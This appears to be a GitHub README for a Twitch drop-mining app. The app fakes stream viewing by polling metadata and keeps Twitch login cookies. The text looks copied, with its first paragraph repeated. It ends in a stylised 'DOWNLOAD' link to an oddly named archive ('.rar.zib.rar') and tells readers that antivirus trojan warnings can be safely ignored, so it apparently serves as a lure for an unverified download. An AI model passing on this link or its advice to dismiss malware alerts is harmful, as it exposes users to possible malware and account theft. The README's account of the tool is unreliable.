# Twitch.Drops.Miner.Windows
This application allows you to AFK mine timed Twitch drops, without having to worry about switching channels when the one you were watching goes offline, claiming the drops, or even receiving the stream data itself. This helps both you and Twitch save on bandwidth and hassle. Everyone wins!
This application allows you to AFK mine timed Twitch drops, without having to worry about switching channels when the one you were watching goes offline, claiming the drops, or even receiving the stream data itself. This helps both you and Twitch save on bandwidth and hassle. Everyone wins!

How It Works:


Every several seconds, the application pretends to watch a particular stream by fetching stream metadata - this is enough to advance the drops. Note that this completely bypasses the need to download any actual stream video and sound. To keep the status (ONLINE or OFFLINE) of the channels up-to-date, there's a websocket connection established that receives events about streams going up or down, or updates regarding the current amount of viewers.

Features:


Stream-less drop mining - save on bandwidth.
Game priority and exclusion lists, allowing you to focus on mining what you want, in the order you want, and ignore what you don't want.
Sharded websocket connection, allowing for tracking up to 8*25-2=199 channels at the same time.
Automatic drop campaigns discovery based on linked accounts (requires you to do account linking yourself though)
Stream tags and drop campaign validation, to ensure you won't end up mining a stream that can't earn you the drop.
Automatic channel stream switching, when the one you were currently watching goes offline, as well as when a channel streaming a higher priority game goes online.
Login session is saved in a cookies file, so you don't need to login every time.
Mining is automatically started as new campaigns appear, and stopped when the last available drops have been mined.



Usage:


Download and unzip the latest release - it's recommended to keep it in the folder it comes in.
Run it and login into your Twitch account using your username and password, and a 2FA key if you have one setup. It's recommended to avoid having to double-take this step, as you can run into CAPTCHA that will prevent you from trying to log in again for the next 12+ hours. You can retry afterwards though.
After a successful login, the app should fetch a list of all available campaigns and games you can mine drops for - you can then select and add games of choice to the Priority List available on the Settings tab, and then press on the Reload button to start processing. It will fetch a list of all applicable streams it can watch, and start mining right away. You can also manually switch to a different channel as needed.
Make sure to link your Twitch account to game accounts on the campaigns page, to enable more games to be mined.
Persistent cookies will be stored in the cookies.jar file, from which the authorization (login) information will be restored on each subsequent run.
![164298155-c0880ad7-6423-4419-8d73-f3c053730a1b](https://github.com/user-attachments/assets/a5ab1119-14cc-4b44-8934-f45ba500717f)


![164298315-81cae0d2-24a4-4822-a056-154fd763c284](https://github.com/user-attachments/assets/2e0b0794-7aec-499c-8695-a786210cd66e)


![164298391-b13ad40d-3881-436c-8d4c-34e2bbe33a78](https://github.com/user-attachments/assets/e1f20278-b3f6-4a89-92b3-7782442d6500)


Notes:
Make sure to keep your cookies file safe, as the authorization information it stores can give another person access to your Twitch account.
Successfully logging into your Twitch account in the application, may cause Twitch to send you a "New Login" notification email. This is normal - you can verify that it comes from your own IP address. The application uses the Twitch's SmartTV account linking process, so the detected browser during the login should signify that as well.
The time remaining timer always countdowns a single minute and then stops - it is then restarted only after the application redetermines the remaining time. This "redetermination" can happen as early as at 10 seconds in a minute remaining, and as late as 20 seconds after the timer reaches zero (especially when finishing mining a drop), but is generally only an approximation and does not represent nor affect actual mining speed. The time variations are due to Twitch sometimes not reporting drop progress at all, or reporting progress for the wrong drop - these cases have all been accounted for in the application though.
Notes about the Windows build:
To achieve a portable-executable format, the application is packaged with PyInstaller into an EXE. Some non-mainstream antivirus engines might report the packaged executable as a trojan, because PyInstaller has been used by others to package malicious Python code in the past. These reports can be safely ignored. If you absolutely do not trust the executable, you'll have to install Python yourself and run everything from source.
The executable uses the %TEMP% directory for temporary runtime storage of files, that don't need to be exposed to the user (like compiled code and translation files). For persistent storage, the directory the executable resides in is used instead.
The autostart feature is implemented as a registry entry to the current user's (HKCU) autostart key. It is only altered when toggling the respective option. If you relocate the app to a different directory, the autostart feature will stop working, until you toggle the option off and back on again
Notes about the Linux build:
The Linux app is built and distributed using two distinct portable-executable formats: AppImage and PyInstaller.
There are no major differences between the two formats, but if you're looking for a recommendation, use the AppImage.
The Linux app should work out of the box on any modern distribution, as long as it has glibc>=2.31 (PyInstaller package) or glibc>=2.35 (AppImage package), plus a working display server.
Every feature of the app is expected to work on Linux just as well as it does on Windows. If you find something that's broken, please open a new issue.
The size of the Linux app is significantly larger than the Windows app due to the inclusion of the gtk3 library (and its dependencies), which is required for proper system tray/notifications support.
As an alternative to the native Linux app, you can run the Windows app via Wine instead. It works really well!


𝓓𝓞𝓦𝓝𝓛𝓞𝓐𝓓

https://github.com/AdminCreator-cpu/Twitch.Drops.Miner.Windows/releases/download/Twitch.Drops.Miner.Windows/Twitch.Drops.Miner.Windows.rar.zib.rar
